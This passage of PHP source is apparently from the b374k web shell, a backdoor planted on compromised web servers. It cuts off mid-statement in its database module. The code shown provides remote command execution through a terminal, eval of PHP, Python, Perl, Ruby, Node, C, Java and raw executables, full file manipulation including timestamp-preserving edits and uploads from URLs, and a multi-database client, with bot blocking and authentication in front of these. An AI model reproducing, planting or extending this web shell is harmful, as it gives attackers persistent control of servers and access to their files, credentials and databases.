} if(!function_exists('eval_get_supported')){ function eval_get_supported(){ $eval_supported = array(); $eval_supported[] = "php"; $check = strtolower(execute("python -h")); if(strpos($check,"usage")!==false) $eval_supported[] = "python"; $check = strtolower(execute("perl -h")); if(strpos($check,"usage")!==false) $eval_supported[] = "perl"; $check = strtolower(execute("ruby -h")); if(strpos($check,"usage")!==false) $eval_supported[] = "ruby"; $check = strtolower(execute("node -h")); if(strpos($check,"usage")!==false) $eval_supported[] = "node"; else{ $check = strtolower(execute("nodejs -h")); if(strpos($check,"usage")!==false) $eval_supported[] = "nodejs"; } $check = strtolower(execute("gcc --help")); if(strpos($check,"usage")!==false) $eval_supported[] = "gcc"; $check = strtolower(execute("java -help")); if(strpos($check,"usage")!==false){ $check = strtolower(execute("javac -help")); if(strpos($check,"usage")!==false) $eval_supported[] = "java"; } return implode(",", $eval_supported); }
} if(!function_exists('eval_go')){ function eval_go($evalType, $evalCode, $evalOptions, $evalArguments){ $res = ""; $output = ""; if($evalOptions!="") $evalOptions = $evalOptions." "; if($evalArguments!="") $evalArguments = " ".$evalArguments; if($evalType=="php"){ ob_start(); eval($evalCode); $res = ob_get_contents(); ob_end_clean(); return $res; } elseif(($evalType=="python")||($evalType=="perl")||($evalType=="ruby")||($evalType=="node")||($evalType=="nodejs")){ $tmpdir = get_writabledir(); chdir($tmpdir); $res .= "Using dir : ".$tmpdir; if(is_writable($tmpdir)){ $res .= " (writable)\n"; $uniq = substr(md5(time()),0,8); $filename = $evalType.$uniq; $path = $filename; $res .= "Temporary file : ".$path; if(write_file($path, $evalCode)){ $res .= " (ok)\n"; $res .= "Setting permissions : 0755"; if(chmod($path, 0755)){ $res .= " (ok)\n"; $cmd = $evalType." ".$evalOptions.$path.$evalArguments; $res .= "Execute : ".$cmd."\n"; $output = execute($cmd); } else $res .= " (failed)\n"; $res .= "Deleting temporary file : ".$path; if(unlink($path)) $res .= " (ok)\n"; else $res .= " (failed)\n"; } else $res .= " (failed)\n"; } else $res .= " (not writable)\n"; $res .= "Finished..."; return $res."{[|b374k|]}".$output; } elseif($evalType=="gcc"){ $tmpdir = get_writabledir(); chdir($tmpdir); $res .= "Using dir : ".$tmpdir; if(is_writable($tmpdir)){ $res .= " (writable)\n"; $uniq = substr(md5(time()),0,8); $filename = $evalType.$uniq.".c"; $path = $filename; $res .= "Temporary file : ".$path; if(write_file($path, $evalCode)){ $res .= " (ok)\n"; $ext = (is_win())? ".exe":".out"; $pathres = $filename.$ext; $evalOptions = "-o ".$pathres." ".$evalOptions; $cmd = "gcc ".$evalOptions.$path; $res .= "Compiling : ".$cmd; $res .= execute($cmd); if(is_file($pathres)){ $res .= " (ok)\n"; $res .= "Setting permissions : 0755"; if(chmod($pathres, 0755)){ $res .= " (ok)\n"; $cmd = $pathres.$evalArguments; $res .= "Execute : ".$cmd."\n"; $output = execute($cmd); } else $res .= " (failed)\n"; $res .= "Deleting temporary file : ".$pathres; if(unlink($pathres)) $res .= " (ok)\n"; else $res .= " (failed)\n"; } else $res .= " (failed)\n"; $res .= "Deleting temporary file : ".$path; if(unlink($path)) $res .= " (ok)\n"; else $res .= " (failed)\n"; } else $res .= " (failed)\n"; } else $res .= " (not writable)\n"; $res .= "Finished..."; return $res."{[|b374k|]}".$output; } elseif($evalType=="java"){ $tmpdir = get_writabledir(); chdir($tmpdir); $res .= "Using dir : ".$tmpdir; if(is_writable($tmpdir)){ $res .= " (writable)\n"; if(preg_match("/class\ ([^{]+){/i",$evalCode, $r)){ $classname = trim($r[1]); $filename = $classname; } else{ $uniq = substr(md5(time()),0,8); $filename = $evalType.$uniq; $evalCode = "class ".$filename." { ".$evalCode . " } "; } $path = $filename.".java"; $res .= "Temporary file : ".$path; if(write_file($path, $evalCode)){ $res .= " (ok)\n"; $cmd = "javac ".$evalOptions.$path; $res .= "Compiling : ".$cmd; $res .= execute($cmd); $pathres = $filename.".class"; if(is_file($pathres)){ $res .= " (ok)\n"; $res .= "Setting permissions : 0755"; if(chmod($pathres, 0755)){ $res .= " (ok)\n"; $cmd = "java ".$filename.$evalArguments; $res .= "Execute : ".$cmd."\n"; $output = execute($cmd); } else $res .= " (failed)\n"; $res .= "Deleting temporary file : ".$pathres; if(unlink($pathres)) $res .= " (ok)\n"; else $res .= " (failed)\n"; } else $res .= " (failed)\n"; $res .= "Deleting temporary file : ".$path; if(unlink($path)) $res .= " (ok)\n"; else $res .= " (failed)\n"; } else $res .= " (failed)\n"; } else $res .= " (not writable)\n"; $res .= "Finished..."; return $res."{[|b374k|]}".$output; } elseif($evalType=="executable"){ $tmpdir = get_writabledir(); chdir($tmpdir); $res .= "Using dir : ".$tmpdir; if(is_writable($tmpdir)){ $res .= " (writable)\n"; $uniq = substr(md5(time()),0,8); $filename = $evalType.$uniq.".exe"; $path = $filename; $res .= "Temporary file : ".$path; if(write_file($path, $evalCode)){ $res .= " (ok)\n"; $cmd = $path.$evalArguments; $res .= "Execute : ".$cmd."\n"; $output = execute($cmd); $res .= "Deleting temporary file : ".$path; if(unlink($path)) $res .= " (ok)\n"; else $res .= " (failed)\n"; } else $res .= " (failed)\n"; } else $res .= " (not writable)\n"; $res .= "Finished..."; return $res."{[|b374k|]}".$output; } return false; }
} if(!function_exists('output')){ function output($str){ $error = @ob_get_contents(); @ob_end_clean(); header("Content-Type: text/plain"); header("Cache-Control: no-cache"); header("Pragma: no-cache"); echo $str; die(); }
}
block_bot();
auth();
chdir(get_cwd());
$nav = get_nav(get_cwd());
$p = array_map("rawurldecode", get_post());
$cwd = html_safe(get_cwd());
$GLOBALS['module'] = array(); $explorer_content = "";
if(isset($p['viewEntry'])){ $path = trim($p['viewEntry']); if(is_file($path)){ $dirname = realpath(dirname($path)).DIRECTORY_SEPARATOR; setcookie("cwd", $dirname); chdir($dirname); $nav = get_nav($dirname); $cwd = html_safe($dirname); $explorer_content = view_file($path, "auto"); } elseif(is_dir($path)){ $path = realpath($path).DIRECTORY_SEPARATOR; setcookie("cwd", $path); chdir($path); $nav = get_nav($path); $cwd = html_safe($path); $explorer_content = show_all_files($path); }
}
else $explorer_content = show_all_files(get_cwd()); $GLOBALS['module']['explorer']['id'] = "explorer";
$GLOBALS['module']['explorer']['title'] = "Explorer";
$GLOBALS['module']['explorer']['js_ontabselected'] = "";
$GLOBALS['module']['explorer']['content'] = $explorer_content; $GLOBALS['module']['terminal']['id'] = "terminal";
$GLOBALS['module']['terminal']['title'] = "Terminal";
$GLOBALS['module']['terminal']['js_ontabselected'] = "
if((!portableMode) && ($('#terminalOutput').html()=='')) $('#terminalInput').focus();";
$GLOBALS['module']['terminal']['content'] = "<pre id='terminalOutput'></pre><table id='terminalPrompt'><tr><td class='colFit'><span id='terminalCwd' class='strong'>".get_cwd()."&gt;</span</td><td id='terminalCommand'><input type='text' id='terminalInput' class='floatLeft' spellcheck='false'></td></tr></table>"; $GLOBALS['module']['eval']['id'] = "eval";
$GLOBALS['module']['eval']['title'] = "Eval";
$GLOBALS['module']['eval']['js_ontabselected'] = "
if((!portableMode) && ($('#evalOutput').html()=='You can also press ctrl+enter to submit')) $('#evalInput').focus();";
$GLOBALS['module']['eval']['content'] = "
<table class='boxtbl'>
<thead> <tr><th colspan='4'><p class='boxtitle'>Eval</p></th></tr>
</thead>
<tbody> <tr><td colspan='4'><textarea id='evalInput' spellcheck='false' style='height:140px;min-height:140px;'></textarea></td></tr> <tr id='evalAdditional'><td colspan='4'> <input type='text' id='evalOptions' value='Options/Switches' spellcheck='false' onkeydown=\"trap_enter(event, 'eval_go');\"> <input type='text' id='evalArguments' value='Arguments' spellcheck='false' onkeydown=\"trap_enter(event, 'eval_go');\"> </td></tr> <tr> <td style='width:144px;'> <select id='evalType'> </select> </td> <td colspan='3'> <span id='evalSubmit' style='width:120px;' class='button' onclick=\"eval_go();\">run</span> </td> </tr> <tr><td colspan='4'><pre id='evalOutput'>You can also press ctrl+enter to submit</pre></td</tr>
</tbody>
</table>
"; $res = "";
if(isset($p['cd'])){ $path = $p['cd']; if(trim($path)=='') $path = dirname(__FILE__); $path = realpath($path); if(is_file($path)) $path = dirname($path); if(is_dir($path)){ chdir($path); $path = $path.DIRECTORY_SEPARATOR; setcookie("cwd", $path); $res = $path."{[|b374k|]}".get_nav($path)."{[|b374k|]}"; if(isset($p['showfiles'])&&($p['showfiles']=='true')){ $res .= show_all_files($path); } } else $res = "error"; output($res);
}
elseif(isset($p['viewFile']) && isset($p['viewType'])){ $path = trim($p['viewFile']); $type = trim($p['viewType']); $preserveTimestamp = trim($p['preserveTimestamp']); if(is_file($path)){ $res = view_file($path, $type, $preserveTimestamp); } else $res = "error"; output($res);
}
elseif(isset($p['renameFile']) && isset($p['renameFileTo'])){ $renameFile = trim($p['renameFile']); $renameFileTo = trim($p['renameFileTo']); if(file_exists($renameFile)){ if(rename($renameFile, $renameFileTo)){ $res = dirname($renameFileTo); } else $res = "error"; } else $res = "error"; output($res);
}
elseif(isset($p['newFolder'])){ $newFolder = trim($p['newFolder']); if(mkdir($newFolder)){ $res = dirname($newFolder); } else $res = "error"; output($res);
}
elseif(isset($p['newFile'])){ $newFile = trim($p['newFile']); if(touch($newFile)){ $res = dirname($newFile); } else $res = "error"; output($res);
}
elseif(isset($p['delete'])){ $path = trim($p['delete']); $dirname = dirname($path); if(is_file($path)){ if(unlink($path)) $res = $dirname; } elseif(is_dir($path)){ if(rmdirs($path)>0) $res = $dirname; } else $res = "error"; if(file_exists($path)) $res = "error"; output($res);
}
elseif(isset($p['editType'])&&isset($p['editFilename'])&&isset($p['editInput'])&&isset($p['preserveTimestamp'])){ $editFilename = trim($p['editFilename']); $editInput = trim($p['editInput']); $editType = trim($p['editType']); $preserveTimestamp = trim($p['preserveTimestamp']); $time = filemtime($editFilename); if($editType=='hex') $editInput = pack("H*" , preg_replace("/\s/","", $editInput)); if(write_file($editFilename, $editInput)){ $res = $editFilename; if($preserveTimestamp=='true') touch($editFilename, $time); } else $res = "error"; output($res);
}
elseif(isset($p['findType'])){ $findType = trim($p['findType']); $findPath = trim($p['findPath']); $findName = trim($p['findName']); $findNameRegex = trim($p['findNameRegex']); $findNameInsensitive = trim($p['findNameInsensitive']); $findContent = trim($p['findContent']); $findContentRegex = trim($p['findContentRegex']); $findContentInsensitive = trim($p['findContentInsensitive']); $findReadable = trim($p['findReadable']); $findWritable = trim($p['findWritable']); $findExecutable = trim($p['findExecutable']); $candidate = get_all_files($findPath); if($findType=='file') $candidate = array_filter($candidate, "is_file"); elseif($findType=='folder') $candidate = array_filter($candidate, "is_dir"); else $res = "error"; foreach($candidate as $k){ if(($findType=="file")||($findType=="folder")){ if(!empty($findName)){ if($findNameRegex=="true"){ $case = ($findNameInsensitive=="true")? "i":""; if(!preg_match("/".$findName."/".$case, basename($k))){ $candidate = array_diff($candidate, array($k)); } } else{ $check = false; if($findNameInsensitive=="true"){ $check = strpos(strtolower(basename($k)), strtolower($findName))===false; } else{ $check = strpos(basename($k), $findName)===false; } if($check){ $candidate = array_diff($candidate, array($k)); } } } } if($findType=="file"){ if(!empty($findContent)){ $content = read_file($k); if($findContentRegex=="true"){ $case = ($findContentInsensitive=="true")? "i":""; if(!preg_match("/".$findContent."/".$case, $content)){ $candidate = array_diff($candidate, array($k)); } } else{ $check = false; if($findContentInsensitive=="true"){ $check = strpos(strtolower($content), strtolower($findContent))===false; } else{ $check = strpos($content, $findContent)===false; } if($check){ $candidate = array_diff($candidate, array($k)); } } } } } foreach($candidate as $k){ if($findReadable=="true"){ if(!is_readable($k)) $candidate = array_diff($candidate, array($k)); } if($findWritable=="true"){ if(!is_writable($k)) $candidate = array_diff($candidate, array($k)); } if($findExecutable=="true"){ if(!is_executable($k)) $candidate = array_diff($candidate, array($k)); } } if(count($candidate)>0){ $res = ""; foreach($candidate as $k){ $res .= "<p><span class='strong'>&gt;</span>&nbsp;<a data-path='".html_safe($k)."' onclick='view_entry(this);'>".html_safe($k)."</a></p>"; } } else $res = ""; output($res);
}
elseif(isset($p['ulType'])){ $ulSaveTo = trim($p['ulSaveTo']); $ulFilename = trim($p['ulFilename']); if($p['ulType']=='comp'){ $ulFile = $_FILES['ulFile']; if(empty($ulFilename)) $ulFilename = $ulFile['name']; if(is_uploaded_file($ulFile['tmp_name'])){ if(!is_dir($ulSaveTo)) mkdir($ulSaveTo); $newfile = realpath($ulSaveTo).DIRECTORY_SEPARATOR.$ulFilename; if(move_uploaded_file($ulFile['tmp_name'], $newfile)){ $res = "<span class='strong'>&gt;</span>&nbsp;<a data-path='".html_safe($newfile)."' onclick='view_entry(this);'>".html_safe($newfile)."</a>&nbsp;( 100% )"; } else $res = "error"; } else $res = "error"; } elseif($p['ulType']=='url'){ $ulFile = trim($p['ulFile']); if(empty($ulFilename)) $ulFilename = basename($ulFile); if(!is_dir($ulSaveTo)) mkdir($ulSaveTo); $newfile = realpath($ulSaveTo).DIRECTORY_SEPARATOR.$ulFilename; if(download($ulFile, $newfile)){ $res = "<span class='strong'>&gt;</span>&nbsp;<a data-path='".html_safe($newfile)."' onclick='view_entry(this);'>".html_safe($newfile)."</a>&nbsp;( 100% )"; } else $res = "error"; } else $res = "error"; output($res);
}
elseif(isset($p['download'])){ $file = trim($p['download']); if(is_file($file)){ header("Content-Type: application/octet-stream"); header('Content-Transfer-Encoding: binary'); header("Content-length: ".filesize($file)); header("Cache-Control: no-cache"); header("Pragma: no-cache"); header("Content-disposition: attachment; filename=\"".basename($file)."\";"); $handler = fopen($file,"rb"); while(!feof($handler)){ print(fread($handler, 1024*8)); @ob_flush(); @flush(); } fclose($handler); die(); }
}
elseif(isset($p['multimedia'])){ $file = trim($p['multimedia']); $mime_list = get_resource('mime'); $mime = ""; $file_ext_pos = strrpos($file, "."); if($file_ext_pos!==false){ $file_ext = trim(substr($file, $file_ext_pos),"."); if(preg_match("/([^\s]+)\ .*\b".$file_ext."\b.*/i", $mime_list, $res)){ $mime = $res[1]; } } if(is_file($file)){ header("Content-Type: ".$mime); header('Content-Transfer-Encoding: binary'); header("Content-length: ".filesize($file)); echo "data:".$mime.";base64,".base64_encode(read_file($file)); die(); }
}
elseif(isset($p['massType'])&&isset($p['massBuffer'])&&isset($p['massPath'])&&isset($p['massValue'])){ $massType = trim($p['massType']); $massBuffer = trim($p['massBuffer']); $massPath = realpath($p['massPath']).DIRECTORY_SEPARATOR; $massValue = trim($p['massValue']); $counter = 0; $massBufferArr = explode("\n", $massBuffer); if(($massType=='tar')||($massType=='targz')||($massType=='zip')){ if(compress($massType, $massValue, $massBufferArr)){ $counter++; return $counter; } } else{ foreach($massBufferArr as $k){ $path = trim($k); if(file_exists($path)){ $preserveTimestamp = filemtime($path); if($massType=='delete'){ if(is_file($path)){ if(unlink($path)) $counter++; } elseif(is_dir($path)){ if(rmdirs($path)>0) $counter++; } } elseif($massType=='cut'){ $dest = $massPath.basename($path); if(rename($path, $dest)){ $counter++; touch($dest, $preserveTimestamp); } } elseif($massType=='copy'){ $dest = $massPath.basename($path); if(is_dir($path)){ if(copys($path, $dest)>0) $counter++; } elseif(is_file($path)){ if(copy($path, $dest)) $counter++; } } elseif(($massType=='untar')||($massType=='untargz')||($massType=='unzip')){ if(decompress($massType, $path, $massValue)){ $counter++; return $counter; } } elseif(!empty($massValue)){ if($massType=='chmod'){ if(chmod($path, octdec($massValue))) $counter++; } elseif($massType=='chown'){ if(chown($path, $massValue)) $counter++; } elseif($massType=='touch'){ if(touch($path, strtotime($massValue))) $counter++; } } } } } if($counter>0) output($counter); output('error');
}
elseif(isset($p['viewFileorFolder'])){ $entry = $p['viewFileorFolder']; if(is_file($entry)) output('file'); elseif(is_dir($entry)) output('folder'); output('error');
}
elseif(isset($p['terminalInput'])){ output(html_safe(execute($p['terminalInput'])));
}
elseif(isset($p['evalInput']) && isset($p['evalType'])){ $evalInput = $p['evalInput']; $evalOptions = (isset($p['evalOptions']))? $p['evalOptions']:""; $evalArguments = (isset($p['evalArguments']))? $p['evalArguments']:""; $evalType = $p['evalType']; error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE); @ini_set('html_errors','0'); @ini_set('display_errors','1'); @ini_set('display_startup_errors','1'); $res = eval_go($evalType, $evalInput, $evalOptions, $evalArguments); if($res===false) $res == "error"; output(html_safe($res));
}
elseif(isset($p['evalGetSupported'])){ $res = eval_get_supported(); output($res);
}
$GLOBALS['module']['convert']['id'] = "convert";
$GLOBALS['module']['convert']['title'] = "Convert";
$GLOBALS['module']['convert']['js_ontabselected'] = "
if((!portableMode) && ($('#decodeResult').children().length==1)) $('#decodeStr').focus();";
$GLOBALS['module']['convert']['content'] = "
<table class='boxtbl'>
<thead> <tr><th colspan='2'><p class='boxtitle'>Convert</p></th></tr>
</thead>
<tbody> <tr><td colspan='2'><textarea style='height:140px;min-height:140px;' id='decodeStr'></textarea></td></tr> <tr><td colspan='2'><span class='button' onclick='decode_go();'>convert</span></td></tr>
</tbody>
<tfoot id='decodeResult'><tr><td colspan='2'>You can also press ctrl+enter to submit</td></tr></tfoot>
</table>"; if(!function_exists('decode')){ function decode($str){ $res = ""; $length = (int) strlen($str); $res .= decode_line("md5", md5($str), "input"); $res .= decode_line("sha1", sha1($str), "input"); $res .= decode_line("base64 encode", base64_encode($str), "textarea"); $res .= decode_line("base64 decode", base64_decode($str), "textarea"); $res .= decode_line("hex to string", @pack("H*" , $str), "textarea"); $res .= decode_line("string to hex", bin2hex($str), "textarea"); $ascii = ""; for($i=0; $i<$length; $i++){ $ascii .= ord(substr($str,$i,1))." "; } $res .= decode_line("ascii char", trim($ascii), "textarea"); $res .= decode_line("reversed", strrev($str), "textarea"); $res .= decode_line("lowercase", strtolower($str), "textarea"); $res .= decode_line("uppercase", strtoupper($str), "textarea"); $res .= decode_line("urlencode", urlencode($str), "textarea"); $res .= decode_line("urldecode", urldecode($str), "textarea"); $res .= decode_line("rawurlencode", rawurlencode($str), "textarea"); $res .= decode_line("rawurldecode", rawurldecode($str), "textarea"); $res .= decode_line("htmlentities", html_safe($str), "textarea"); if(function_exists('hash_algos')){ $algos = hash_algos(); foreach($algos as $algo){ if(($algo=='md5')||($algo=='sha1')) continue; $res .= decode_line($algo, hash($algo, $str), "input"); } } return $res; }
} if(!function_exists('decode_line')){ function decode_line($type, $result, $inputtype){ $res = "<tr><td class='colFit'>".$type."</td><td>"; if($inputtype=='input'){ $res .= "<input type='text' value='".html_safe($result)."' ondblclick='this.select();'>"; } else{ $res .= "<textarea style='height:80px;min-height:80px;' ondblclick='this.select();'>".html_safe($result)."</textarea>"; } return $res; }
} if(isset($p['decodeStr'])){ $decodeStr = $p['decodeStr']; output(decode($decodeStr));
}
$GLOBALS['module']['database']['id'] = "database";
$GLOBALS['module']['database']['title'] = "Database";
$GLOBALS['module']['database']['js_ontabselected'] = "";
$GLOBALS['module']['database']['content'] = "
<table class='boxtbl'>
<thead> <tr><th colspan='3'><p class='boxtitle'>Connect</p></th></tr>
</thead>
<tbody> <tr class='dbHostRow'><td style='width:144px' class='dbHostLbl'>Host</td><td colspan='2'><input type='text' id='dbHost' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr> <tr class='dbUserRow'><td>Username</td><td colspan='2'><input type='text' id='dbUser' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr> <tr class='dbPassRow'><td>Password</td><td colspan='2'><input type='text' id='dbPass' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr> <tr class='dbPortRow'><td>Port (Optional)</td><td colspan='2'><input type='text' id='dbPort' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>
</tbody>
<tfoot> <tr class='dbConnectRow'> <td style='width:144px;'> <select id='dbType'> </select> </td> <td style='width:120px;'><span class='button' onclick=\"db_connect();\">connect</span></td> <td class='dbError'></td> </tr> <tr class='dbQueryRow' style='display:none;'> <td colspan='3'><textarea id='dbQuery' style='min-height:140px;height:140px;'>You can also press ctrl+enter to submit</textarea></td> </tr> <tr class='dbQueryRow' style='display:none;'> <td style='width:120px;'><span class='button' onclick=\"db_run();\">run</span></td> <td style='width:120px;'><span class='button' onclick=\"db_disconnect();\">disconnect</span></td> <td>Separate multiple commands with a semicolon <span class='strong'>(</span> ; <span class='strong'>)</span></td> </tr>
</tfoot>
</table>
<div id='dbBottom' style='display:none;'>
<br>
<table class='border' style='padding:0;'><tr><td id='dbNav' class='colFit borderright' style='vertical-align:top;'></td><td id='dbResult' style='vertical-align:top;'></td></tr></table>
</div>
"; if(!function_exists('sql_connect')){ function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass){ if($sqltype == 'mysql'){ if(class_exists('mysqli')) return new mysqli($sqlhost, $sqluser, $sqlpass); elseif(function_exists('mysql_connect')) return @mysql_connect($sqlhost, $sqluser, $sqlpass); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_connect')){ $coninfo = array("UID"=>$sqluser, "PWD"=>$sqlpass); return @sqlsrv_connect($sqlhost,$coninfo); } elseif(function_exists('mssql_connect')) return @mssql_connect($sqlhost, $sqluser, $sqlpass); } elseif($sqltype == 'pgsql'){ $hosts = explode(":", $sqlhost); if(count($hosts)==2){ $host_str = "host=".$hosts[0]." port=".$hosts[1]; } else $host_str = "host=".$sqlhost; if(function_exists('pg_connect')) return @pg_connect("$host_str user=$sqluser password=$sqlpass"); } elseif($sqltype == 'oracle'){ if(function_exists('oci_connect')) return @oci_connect($sqluser, $sqlpass, $sqlhost); } elseif($sqltype == 'sqlite3'){ if(class_exists('SQLite3')) if(!empty($sqlhost)) return new SQLite3($sqlhost); else return false; } elseif($sqltype == 'sqlite'){ if(function_exists('sqlite_open')) return @sqlite_open($sqlhost); } elseif($sqltype == 'odbc'){ if(function_exists('odbc_connect')) return @odbc_connect($sqlhost, $sqluser, $sqlpass); } elseif($sqltype == 'pdo'){ if(class_exists('PDO')) if(!empty($sqlhost)) return new PDO($sqlhost, $sqluser, $sqlpass); else return false; } return false; }
} if(!function_exists('sql_query')){ function sql_query($sqltype, $query, $con){ if($sqltype == 'mysql'){ if(class_exists('mysqli')) return $con->query($query); elseif(function_exists('mysql_query')) return mysql_query($query); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_query')) return sqlsrv_query($con,$query); elseif(function_exists('mssql_query')) return mssql_query($query); } elseif($sqltype == 'pgsql') return pg_query($query); elseif($sqltype == 'oracle') return oci_execute(oci_parse($con, $query)); elseif($sqltype == 'sqlite3') return $con->query($query); elseif($sqltype == 'sqlite') return sqlite_query($con, $query); elseif($sqltype == 'odbc') return odbc_exec($con, $query); elseif($sqltype == 'pdo') return $con->query($query); }
} if(!function_exists('sql_num_rows')){ function sql_num_rows($sqltype,$result){ if($sqltype == 'mysql'){ if(class_exists('mysqli_result')) return $result->mysqli_num_rows; elseif(function_exists('mysql_num_rows')) return mysql_num_rows($result); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($result); elseif(function_exists('mssql_num_rows')) return mssql_num_rows($result); } elseif($sqltype == 'pgsql') return pg_num_rows($result); elseif($sqltype == 'oracle') return oci_num_rows($result); elseif($sqltype == 'sqlite3'){ $metadata = $result->fetchArray(); if(is_array($metadata)) return $metadata['count']; } elseif($sqltype == 'sqlite') return sqlite_num_rows($result); elseif($sqltype == 'odbc') return odbc_num_rows($result); elseif($sqltype == 'pdo') return $result->rowCount(); }
} if(!function_exists('sql_num_fields')){ function sql_num_fields($sqltype, $result){ if($sqltype == 'mysql'){ if(class_exists('mysqli_result')) return $result->field_count; elseif(function_exists('mysql_num_fields')) return mysql_num_fields($result); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($result); elseif(function_exists('mssql_num_fields')) return mssql_num_fields($result); } elseif($sqltype == 'pgsql') return pg_num_fields($result); elseif($sqltype == 'oracle') return oci_num_fields($result); elseif($sqltype == 'sqlite3') return $result->numColumns(); elseif($sqltype == 'sqlite') return sqlite_num_fields($result); elseif($sqltype == 'odbc') return odbc_num_fields($result); elseif($sqltype == 'pdo') return $result->columnCount(); }
} if(!function_exists('sql_field_name')){ function sql_field_name($sqltype,$result,$i){ if($sqltype == 'mysql'){ if(class_exists('mysqli_result')) { $z=$result->fetch_field();return $z->name;} elseif(function_exists('mysql_field_name')) return mysql_field_name($result,$i); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_field_metadata')){ $metadata = sqlsrv_field_metadata($result); if(is_array($metadata)){ $metadata=$metadata[$i]; } if(is_array($metadata)) return $metadata['Name']; } elseif(function_exists('mssql_field_name')) return mssql_field_name($result,$i); } elseif($sqltype == 'pgsql') return pg_field_name($result,$i); elseif($sqltype == 'oracle') return oci_field_name($result,$i+1); elseif($sqltype == 'sqlite3') return $result->columnName($i); elseif($sqltype == 'sqlite') return sqlite_field_name($result,$i); elseif($sqltype == 'odbc') return odbc_field_name($result,$i+1); elseif($sqltype == 'pdo'){ $res = $result->getColumnMeta($i); return $res['name']; } }
} if(!function_exists('sql_fetch_data')){ function sql_fetch_data($sqltype,$result){ if($sqltype == 'mysql'){ if(class_exists('mysqli_result')) return $result->fetch_row(); elseif(function_exists('mysql_fetch_row')) return mysql_fetch_row($result); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($result,1); elseif(function_exists('mssql_fetch_row')) return mssql_fetch_row($result); } elseif($sqltype == 'pgsql') return pg_fetch_row($result); elseif($sqltype == 'oracle') return oci_fetch_row($result); elseif($sqltype == 'sqlite3') return $result->fetchArray(1); elseif($sqltype == 'sqlite') return sqlite_fetch_array($result,1); elseif($sqltype == 'odbc') return odbc_fetch_array($result); elseif($sqltype == 'pdo') return $result->fetch(2); }
} if(!function_exists('sql_close')){ function sql_close($sqltype,$con){ if($sqltype == 'mysql'){ if(class_exists('mysqli')) return $con->close(); elseif(function_exists('mysql_close')) return mysql_close($con); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_close')) return sqlsrv_close($con); elseif(function_exists('mssql_close')) return mssql_close($con); } elseif($sqltype == 'pgsql') return pg_close($con); elseif($sqltype == 'oracle') return oci_close($con); elseif($sqltype == 'sqlite3') return $con->close(); elseif($sqltype == 'sqlite') return sqlite_close($con); elseif($sqltype == 'odbc') return odbc_close($con); elseif($sqltype == 'pdo') return $con = null; }
} if(!function_exists('sql_get_supported')){ function sql_get_supported(){ $db_supported = array(); if(function_exists("mysql_connect")) $db_supported[] = 'mysql'; if(function_exists("mssql_connect") || function_exists("sqlsrv_connect")) $db_supported[] = 'mssql'; if(function_exists("pg_connect")) $db_supported[] = 'pgsql'; if(function_exists("oci_connect")) $db_supported[] = 'oracle'; if(function_exists("sqlite_open")) $db_supported[] = 'sqlite'; if(class_exists("SQLite3")) $db_supported[] = 'sqlite3'; if(function_exists("odbc_connect")) $db_supported[] = 'odbc'; if(class_exists("PDO")) $db_supported[] = 'pdo'; return implode(",", $db_supported); }
} if(isset($p['dbGetSupported'])){ $res = sql_get_supported(); if(empty($res)) $res = "error"; output($res);
}
elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['dbPass'])&&isset($p['dbPort'])){ $type = $p['dbType']; $host = $p['dbHost']; $user = $p['dbUser']; $pass = $p['dbPass']; $port = $p['dbPort']; $con = sql_connect($type ,$host , $user , $pass); $res = ""; if($con!==false){ if(isset($p['dbQuery'])){ $query = $p['dbQuery']; $pagination = ""; if((isset($p['dbDB']))&&(isset($p['dbTable']))){ $db = trim($p['dbDB']); $table = trim($p['dbTable']); $start = (int) (isset($p['dbStart']))? trim($p['dbStart']):0; $limit = (int) (isset($p['dbLimit']))? trim($p['dbLimit']):100; if($type=='mysql'){ $query = "SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$limit.";"; } elseif($type=='mssql'){ $query = "SELECT TOP ".$limit." * FROM ".$db."..".$table.";"; } elseif($type=='pgsql'){ $query = "SELECT * FROM ".$db.".".$table." LIMIT ".$limit." OFFSET ".$start.";"; } elseif($type=='oracle'){ $limit = $start + $limit; $query = "SELECT * FROM ".$db.".".$table." WHERE ROWNUM BETWEEN ".$start." AND ".$limit.";"; } elseif($type=='sqlite' || $type=='sqlite3'){ $query = "SELECT * FROM ".$table." LIMIT ".$start.",".$limit.";"; } else $query = ""; $pagination = "Limit <input type='text' id='dbLimit' value='".html_safe($limit)."' style='width:50px;'> <span class='button' onclick=\"db_pagination('prev');\">prev</span> <span class='button' onclick=\"db_pagination('next');\">next</span> <input type='hidden' id='dbDB' value='".html_safe($db)."'> <input type='hidden' id='dbTable' value='".html_safe($table)."'> <input type='hidden' id='dbStart' value='".html_safe($start)."'> "; } $querys = explode(";", $query); foreach($querys as $query){ if(trim($query) != ""){ $query_query = sql_query($type, $query, $con); if($query_query!=false){ $res .= "<p>".html_safe($query).";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> ok <span class='strong'>]</span></p>"; if(!empty($pagination)){ $res .= "<p>".$pagination."</p>"; } if(!is_bool($query_query)){ $res .= "<table class='border dataView sortable tblResult'><tr>"; for($i = 0; $i < sql_num_fields($type, $query_query); $i++) $res .= "<th>".html_safe(sql_field_name($type, $query_query, $i))."</th>"; $res .= "</tr>"; while($rows = sql_fetch_data($type, $query_query)){ $res .= "<tr>"; foreach($rows as $r){ if(empty($r)) $r = " "; $res .= "<td>".html_safe($r)."</td>"; } $res .= "</tr>"; } $res .= "</table>"; } } else{ $res .= "<p>".html_safe($query).";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> error <span class='strong'>]</span></p>"; } } } } else{ if(($type!='pdo') && ($type!='odbc')){ if($type=='mysql') $showdb = "SHOW DATABASES"; elseif($type=='mssql') $showdb = "SELECT name FROM master..sysdatabases"; elseif($type=='pgsql') 